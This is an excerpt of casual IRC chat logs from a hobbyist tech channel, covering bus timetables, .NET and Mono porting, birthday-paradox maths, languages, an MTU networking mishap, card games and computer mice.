Jul 22 12:14:24 <shikhin>	[nolog] . o O ( Starting a gofundme so you can also bring your own openable glass cases. )
Jul 22 12:16:07 <nortti>	[nolog] shikhin: I have considered either making my own from wood + acrylic or appropriating some from abandoned bus stops, but I don't know how to keep former secret from my family or latter secret from anyone in a 2km radius

Jul 22 12:19:08 <FireFly>	even the small middle-of-nowhere ones had easy-to-read timetables for the station at hand
Jul 22 12:19:14 <nortti>	cool

Jul 22 12:19:55 <antkit>	shikhin: There's an offline app I have called Delhi Public Transit which has all the bus timetables.

Jul 22 12:20:57 <nortti>	heh, nice
Jul 22 12:23:27 <nortti>	[nolog] shikhin: also, I wouldn't want the tables to be taken down by the city of oulu ppl, which might happen if I provided my own cases
Jul 22 12:24:29 <shikhin>	[nolog] nortti: Do the bus stands have nothing to just tape the timetables onto? Or do those get taken down quickly?
Jul 22 12:24:47 <shikhin>	[nolog] Alternatively, you tape a request for the city to put a timetable there.
Jul 22 12:25:42 <nortti>	[nolog] taping is the one possibility I've thought about. just unsure how well plain paper could take on the elements

Jul 22 13:21:15 <nortti>	what was the problem?
Jul 22 13:21:49 <puck>	I just didn't try and assumed I updated it to modern .NET
Jul 22 13:22:13 <nortti>	and it was some old version of .NET?
Jul 22 13:22:20 <puck>	so
Jul 22 13:22:26 <puck>	in the beginning, there was .NET. and it was Windows only
Jul 22 13:22:41 <puck>	then, some people wrote a replacement .NET interpreter, and it was called mono
Jul 22 13:22:59 <puck>	then, .NET became open source and known as dotnet (and also .NET core)
Jul 22 13:23:06 <puck>	then .NET core was ported to linux
Jul 22 13:23:59 <puck>	I never ported CaI past Mono, which is effectively equal to just plain .NET (4.5) on Windows
Jul 22 13:26:02 <nortti>	so it didn't like dotnet?
Jul 22 13:26:06 <puck>	yeah
Jul 22 13:26:31 <nortti>	and you switched to mono, and now it works?
Jul 22 13:26:52 <puck>	well, nixos doesn't like dotnet, dotnet does'nt like nixos, so it's mutual
Jul 22 13:27:03 <puck>	and code ported to dotnet can't be run in mono, as it requires a newer runtime

Jul 22 14:48:33 <olsner>	is it actually a key card or do they just slap it on the right place to activate the other vulnerability?
Jul 22 14:48:54 <puck>	it's actually a keycard! it will show a special view in which you type whichever locker number you want to open
Jul 22 14:49:04 <puck>	... i mean, those terminals are raspis

Jul 23 01:23:31 <john_cephalopoda>	I wonder what they count as "social networking".
Jul 23 01:24:11 <john_cephalopoda>	You could say that video sites are basically social networks through their commenting system.
Jul 23 01:24:57 <nortti>	well, it specifically mentioned youtube, so…
Jul 23 01:25:35 <nortti>	probably there's no "social networking" in the law, but rather it only applies to porn sites and the definition of porn site can't include tumblr

Jul 23 01:40:27 <john_cephalopoda>	Well, 4chan and 8ch are image boards and have sub-boards (or however you call those) that are targeted at non-porn discussions.
Jul 23 01:41:07 <john_cephalopoda>	Most boorus can probably be considered porn sites though.

Jul 23 09:22:26 <uplime>	quick. invite 11 more members
Jul 23 09:22:34 <nortti>	11?

Jul 23 09:31:34 <uplime>	nortti: wikipedia seems to talk about the birthday paradox in terms of the pidgeon hole theory
Jul 23 09:31:48 <uplime>	but you would know better than me
Jul 23 09:31:58 <nortti>	ah, okay
Jul 23 09:32:47 <nortti>	I thought the pidgeon hole principle was more about when you have N holes and >N things
Jul 23 09:32:55 <uplime>	it might be

Jul 23 09:33:23 <uplime>	hrm, i guess you're right
Jul 23 09:33:41 <uplime>	since containers would be the colors, and people would be the things, and containers > things
Jul 23 09:34:08 <nortti>	mh
Jul 23 09:34:26 <uplime>	mh
Jul 23 09:35:19 <nortti>	hydraz: running the test 10000 times, looks like the median is 3 colours with at least 3 people of that colour and mean is somewhere around 3.05
Jul 23 09:36:10 <hydraz>	:(
Jul 23 09:40:37 <hydraz>	so how many colours do I need?
Jul 23 09:40:44 <nortti>	for what?
Jul 23 09:40:57 <hydraz>	to have no conflicts in #offtopia population
Jul 23 09:41:24 <nortti>	no conflicts at what propability? > 0.5?
Jul 23 09:42:04 <hydraz>	sure
Jul 23 09:43:52 <nortti>	e
Jul 23 09:43:55 <nortti>	er
Jul 23 09:45:31 <nortti>	so, the propability for no conflicts is basically \product_{k=0}^p (c-k)/c where p is the size of channel and c the number of colours
Jul 23 09:47:13 <nortti>	er, ^{p-1}
Jul 23 09:51:19 <nortti>	hydraz: 1784 colours
Jul 23 09:52:24 <hydraz>	i feel like that's a bit more than I can tolerate
Jul 23 09:52:48 <uplime>	###cards?

Apr 20 01:55:47 <nortti>	mm, I guess part of it is that swimming instructors generally don't remember how they learnt all of this, and so things that become simple later just feel trivial to them

Apr 21 02:00:34 <nortti>	hm, it was interesting
Apr 21 02:00:59 <nortti>	like, it's pretty clearly a protest song, but it's generally not very direct
Apr 21 02:01:27 <shikhin>	Mm.
Apr 21 02:02:45 <nortti>	also last line is interesting, "vo pāgal kuttā āvārā thā merā hamsafar"
Apr 21 02:03:49 <nortti>	like, is the me-person of the song embracing the presence of that mad dog, or are they just accepting that it is going to be there?
Apr 21 02:03:56 <shikhin>	Oh.
Apr 21 02:05:28 <shikhin>	"bas ek pāgal kuttā āvārā thā jo bhauṅk bhauṅk ke kar rahā thā ye fasānā bayān \ ke jānvar ke bahāne qatl kīe gae insān haĩ"  "Everyone was shouting about the greatness of the murderers \ Except one wandering crazy dog, who was barking about the tale"  Also the last time the mad dog is mentioned, there's clips of communist student leaders and activists and the like that plays in the

Apr 21 02:17:01 <shikhin>	But, uh, nice lines like "mardõ kā bhagvān kar rahā thā likhnā aurtõ kī qismat shurū" that I wouldn't mind muttering, yet the ones stuck in my head for the past two days are obviously "aur vo nazārā rūbarū thā merī nazar se \ do lāshẽ laṭak rahī thī ek hī shākh-e-shajar se".

Sep 10 10:34:58 <matheus>	ahoy sortie
Sep 10 10:35:23 <sortie>	Hi hi matheus
Sep 10 10:42:08 <sortie>	Dinner
Sep 10 10:53:18 <matheus>	bone appletea
Sep 10 10:59:48 <john_cephalopoda>	Heh, now that my gf is learning German, I am confronted with all those peculiarities in the language. Like "zu Hause", which means "at home" but doesn't make a lot of sense gramatically in modern German.
Sep 10 11:00:46 <olsner>	at home or towards house
Sep 10 11:01:03 <john_cephalopoda>	"Hause" is an old-fashioned dative form of "Haus".
Sep 10 11:01:19 <nortti>	olsner: I think former, since there's nach Hause
Sep 10 11:02:55 <olsner>	I always thought the literal meaning was towards house, but I don't know how well they taught us what 'zu' meant back them
Sep 10 11:03:17 <nortti>	mm
Sep 10 11:03:47 <nortti>	but yeah, these tend to be really stock-y phrases
Sep 10 11:04:12 <john_cephalopoda>	"Zu" is quite old-fashioned, I can't think of any other situation where it would be used like that.
Sep 10 11:04:58 <nortti>	in hungarian you have ház 'house' (not etymologically related to de:Haus if you can believe) - itthon 'at home' (when you're at home) / otthon 'at home' (when you aren't) - haza 'to home'
Sep 10 11:05:52 <nortti>	while the regular case usage would prolly give you házban or házan for 'at home' and házba or házra for 'to home'
Sep 10 11:07:18 <nortti>	and in finnish you have koti 'home' - kotona 'at home' (lit. "as a home"). "to home" is regular, kotiin, but kotoa 'from home' would in modern language be understood as "some but not all of home" or as marking home as the object
Sep 10 11:12:38 <sortie>	Dinner was good
Sep 10 11:13:09 <matheus>	that's good
Sep 10 11:13:31 <olsner>	do you occasionally have evil dinner?
Sep 10 11:16:32 <CrazyEttin>	Hail seitan!
Sep 10 11:17:23 <nortti>	somehow, we still don't have a vege restaurant built on an old navy vessel called warship seitan
Sep 10 11:18:00 <CrazyEttin>	wait what :D

Sep 10 12:45:15 <john_cephalopoda>	matheus: I am using a Board Support Package shipped by one company, a protocol stack by an other company and a bunch of HAL libraries by a third. I just haven't got the time to run around and fix other people's problems when writing "if (1==x)" is just as good.

But it really is bad to invest in compiler warnings that actually do highlight bugs and not invest the time to silence the false positives. It makes people not trust them and things get worse.

If left unattended, they can eat terabytes of storage per night. The best solution is to capture them and regulate their diet so that they grow accustomed to relatively little swap.

Sep 11 21:01:28 <nanovad>	Domesticated vims are very energetic and zealous animals. Little is truly known about their modes of communication, so they often feel misunderstood.

Sep 11 21:09:38 <nanovad>	klange: The simple solution is to never crash

Sep 11 21:57:48 <nanovad>	:D:
Sep 11 23:35:52 <olsner>	instead of swap files, maybe you could make a session system with e.g. complete undo history and stuff, not just "unsaved changes in some loose file"
Sep 11 23:36:12 <olsner>	(and that uses some database format with proper transactions that is always safe against power loss or crashing)

Sep 14 12:00:08 <nortti>	is that the minimum IPv4 allows?
Sep 14 12:00:12 <t3h_PeNgU1N_oF_d>	yes
Sep 14 12:00:15 <t3h_PeNgU1N_oF_d>	i was slightly worried
Sep 14 12:00:17 <CompanionCube>	that's the minimum the standard specifies
Sep 14 12:00:20 <t3h_PeNgU1N_oF_d>	and i did not believe it would go down that far
Sep 14 12:01:01 <CompanionCube>	'Every internet module must be able to forward a datagram of 68 octets without further fragmentation.  This is because an internet header may be up to 60 octets, and the minimum fragment is 8 octets.'

Sep 14 12:08:14 <CompanionCube>	nortti: also i did actually find the source of that cpgb-ml picture, it's from a deviantart named 'cpgb-ml' but i'm not sure if it's official or not

Sep 14 12:09:59 <CompanionCube>	nortti: it's bad if it's official because it's a bad opinion, and it's bad if it's not because they're allowing someone to impersonate them like that
Sep 14 12:10:18 <nortti>	aye
Sep 14 12:10:55 <CompanionCube>	(there's also something vaguely sad about a political party being on deviantart)
Sep 14 12:12:59 <CompanionCube>	i'd lean towards 'not' since they have links to e.g an official instagram on their frontpage, but not deviantart. But maybe it's just old or linked to from another part.
Sep 14 12:13:35 <PeNgU1n_oF_d00m>	nothing i can even find defaults to 128 mtu
Sep 14 12:22:40 <nortti>	can you traceroute to where the drop happens?
Sep 14 12:23:15 <PeNgU1n_oF_d00m>	it's between the router and the VM host
Sep 14 12:23:25 <PeNgU1n_oF_d00m>	like, the VM host is the first hop that doesn't work
Sep 14 12:24:35 <nortti>	mm
Sep 14 12:25:20 <PeNgU1n_oF_d00m>	i checked and it isn't path MTU, since illumos' minimum is > 500 default and i have no reason to imagine they changed that
Sep 14 12:26:09 <PeNgU1n_oF_d00m>	so i think..
Sep 14 12:28:29 <PeNgU1n_oF_d00m>	oh gods

Sep 14 12:31:22 <PeNgU1n_oF_d00m>	i set my vps' mtu to 108

Sep 14 13:31:02 <CrazyEttin>	Earlier today i was rewatching star trek, and by pure coincidence it was an episode where they played chess at one point.
Sep 14 13:31:12 ✽	CrazyEttin is having chess withdrawal symptoms
Sep 14 13:31:23 <shikhin>	< CrazyEttin> I guess it’s just one of those games that really needs to be played irl. <- Huh. I played CaH IRL, and it wasn't nearly as fun.
Sep 14 13:31:34 <CrazyEttin>	Interesting :O
Sep 14 13:31:51 <shikhin>	For one, there was this constant pressure to "react" to the cards (while I like to just read them and chuckle, and /maybe/ comment sometimes).
Sep 14 13:31:52 <nortti>	shikhin: maybe your irl friends just suck
Sep 14 13:31:54 <nortti>	mm
Sep 14 13:32:12 <shikhin>	nortti: :D:
Sep 14 13:32:18 <shikhin>	I have made friends with a Marxist!
Sep 14 13:32:30 <nortti>	a wild Marxist appearead
Sep 14 13:32:39 <CrazyEttin>	Yeah, that sounds like the people you played with were not the best people for that.
Sep 14 13:32:51 <nortti>	also, re. reactions, I wanna say we used to comment more on the cards back in ye olden days of #osdev-offtopic-cards
Sep 14 13:32:52 <john_cephalopoda>	It was Karl Marx in disguise.
Sep 14 13:33:11 <CrazyEttin>	In my opinion, the irc version of the game is too fast
Sep 14 13:33:14 <shikhin>	nortti: I think so, but I think no one notices if someone just silently plays along anyway.
Sep 14 13:33:26 <CrazyEttin>	I like to think about the cards and talk with the other players.
Sep 14 13:33:30 <nortti>	shikhin: hm, how do you mean?
Sep 14 13:33:44 <shikhin>	If I don't comment on the cards (in IRC), it's alright.
Sep 14 13:33:49 <shikhin>	But IRL, it's really obvious if you don't laugh along with everyone else.
Sep 14 13:33:52 <nortti>	oh, ah
Sep 14 13:34:04 <shikhin>	nortti~something: We're thinking of starting a reading club!
Sep 14 13:34:07 <nortti>	my point was that while we started with reactions, it eventually got dropped
Sep 14 13:34:21 <CompanionCube>	shikhin: reading what?
Sep 14 13:34:40 <nortti>	The Capital, of course
Sep 14 13:34:45 <CrazyEttin>	:D
Sep 14 13:34:50 <shikhin>	I don't know. They said they had a recommendation for me, so I was already excited, but turns out it was Pedagogy of the Oppressed which I have read before.
Sep 14 13:34:54 <shikhin>	But we'll figure it out, I suppose.
Sep 14 13:35:31 <nortti>	CrazyEttin: I guess one reason it's so fast is that we used to have a timeout of 1min per round

Sep 14 13:35:38 <nortti>	+t
Sep 14 13:35:55 <nortti>	but some is prolly just cultural
Sep 14 13:35:56 <CrazyEttin>	0_o
Sep 14 13:36:48 <shikhin>	Based on my sample size of nortti, I also thought Finns would not dislike dark humor, but that apparently isn't the case.
Sep 14 13:37:03 <nortti>	oh?
Sep 14 13:37:45 <shikhin>	Indeed, I think they explicitly said so during IRL cards.
Sep 14 13:38:17 <CrazyEttin>	Weird
Sep 14 13:38:27 <nortti>	huh
Sep 14 13:38:28 <CrazyEttin>	Most of my circle of friends love dark humour.

Sep 14 13:38:54 <nortti>	shikhin: tell them they're officially banished from the nation

Sep 14 13:39:18 ✽	CrazyEttin originally read “Finns would dislike dark humour”

Sep 14 13:40:30 <CompanionCube>	shikhin: so apart from your marxist friend, how many others would you entice into this lefty(?) reading club?
Sep 14 13:41:02 <shikhin>	CompanionCube: At least one other first-year math student seemed interesting... but hopefully everyone in the math department.
Sep 14 13:41:25 <shikhin>	Er, seemed interested*.
Sep 14 13:42:37 <CompanionCube>	heh, math and marx do alliterate nicely....
Sep 14 13:42:59 <shikhin>	Well, hopefully people from other departments too, but I don't know many yet.
Sep 14 13:43:11 <nortti>	oh, yeah, CrazyEttin, can you think of a good way to fuck with the finn by having shikhin display some shared knowledge they'd not expect
Sep 14 13:43:35 <shikhin>	I did display some knowledge that surprised them, but I can't remember exactly what.

Sep 14 13:44:07 <CrazyEttin>	hmm.

Sep 15 03:46:50 <sortie>	Hello
Sep 15 03:48:27 <nortti>	hewwo
Sep 15 03:48:46 <sortie>	Still sick. At least no coughing.
Sep 15 03:48:51 <nortti>	mm
Sep 15 03:49:23 <sortie>	But it does make me feel better about staying home from work on Friday where I wasn't 100% sure I was sick.
Sep 15 03:53:39 <sortie>	"Your camp could not be placed on this game server. Would you like to stay here and build a camp elsewhere, or try another server?" If there is another server, then why didn't you send me there in the first place!
Sep 15 03:53:55 <nortti>	camp?
Sep 15 03:54:21 <sortie>	In Fallout 76, you can place a camp anywhere in the world that's not already settled. You can build your stuff there.
Sep 15 03:54:27 <nortti>	ah
Sep 15 03:54:32 <sortie>	Basically a home base. Quite useful mechanic.
Sep 15 03:55:04 <sortie>	Trouble is if some other player pick your spot because you're a genius that found a quite optimal spot and yet somehow everyone else also knows that.
Sep 15 03:55:17 <olsner>	another server then means another world? what if your friends are on the first server/world?
Sep 15 03:55:40 <sortie>	All my friends are on IRC
Sep 15 03:55:47 <sortie>	:)
Sep 15 03:56:17 <sortie>	But that is a good point. I don't play this game with anyone. It's multiplayed although I play it single because I'm not into multiplayer.
Sep 15 03:56:44 <sortie>	In any case, I just click 'Play' and it figures it out. There is a social mode to find the same world as your in-game friends.
Sep 15 03:56:49 <nortti>	how much do you run into other ppl?
Sep 15 03:57:13 <sortie>	Actually not that much
Sep 15 03:57:19 <sortie>	It is a large world
Sep 15 03:57:39 <sortie>	I do hate when someone is currently crawling the dungeon I wanted to play undisturbed.
Sep 15 03:57:41 <nortti>	mm
Sep 15 03:58:00 <sortie>	I do capitalize on the in-game economy by selling stuff from my settlement, so other players show up and purchase
Sep 15 03:58:20 <nortti>	ah
Sep 15 03:58:33 <nortti>	hm, so I guess you could set up your camp there?
Sep 15 03:58:42 <nortti>	or is the camp only there if you're online?
Sep 15 03:58:52 <sortie>	It's only there if I'm online
Sep 15 03:59:06 <nortti>	ah
Sep 15 03:59:13 <nortti>	makes sense
Sep 15 04:05:48 <nortti>	tfw you realize the reason you couldn't figure how an attack on cryptopals works (I try to figure out that before implementing it each time) was that you were misreading "C_1, C_2, C_3 -> C_1, 0, C_1" as "C_1, C_2, C_3 -> C_1, 0, C_3"
Sep 15 05:02:17 <john_cephalopoda>	I use Linux on all my devices but my mouse is Microsoft-branded :D
Sep 15 05:03:39 <john_cephalopoda>	I only use relatively cheap mice, and I have to say that HAMA has been the best manufacturer that I know in that area. Those things hold for a decade or longer.
Sep 15 05:05:32 <john_cephalopoda>	The DELL mice I used got a bit floppy in the buttons after some time, one microsoft mouse wend dead, a Thermaltake Talon Blu died, too.

Sep 15 05:10:13 <john_cephalopoda>	And various other cheap mice. Maybe one of the worst in how it felt was a Grundig mouse. Super-cheap plastic.
Sep 15 05:11:01 <nortti>	why do you only use cheap mice, out of interest?
Sep 15 05:16:51 <john_cephalopoda>	They work for me. I usually use the mouse that comes with the computer until that mouse breaks down, then I go to the store and get a new one, which I again use until it dies. I usually use hama mice because of my good experience with their durability, but occasionally I try out something else - which always went bad.
Sep 15 05:17:59 <nortti>	the fact that you have mice dying seems to suggest that this is suboptimal, at least when thinking from e-waste perspective
Sep 15 05:18:24 <john_cephalopoda>	It is mainly the more expensive mice dying.
Sep 15 05:19:55 <olsner>	going through enough mice that you have a "usual" brand does sound like a symptom
Sep 15 05:19:56 <john_cephalopoda>	And I don't think that a 150€ mouse will last much longer.
Sep 15 05:23:30 <john_cephalopoda>	I haven't actually bought that many Hama mice. Maybe 2 or 3 over all the years I've been using computers.
Sep 15 05:25:48 <john_cephalopoda>	Maybe I got wrong price expecatations. When I can get a mouse that lasts an eternity for 20€, I assume that something like a Talon Blu, which cost 30€ or so at that time, would be of better quality and last some.
Sep 15 05:31:04 <olsner>	why would you assume that?
Sep 15 05:33:31 <john_cephalopoda>	Because the capitalist system teaches us that more expensive means more value.
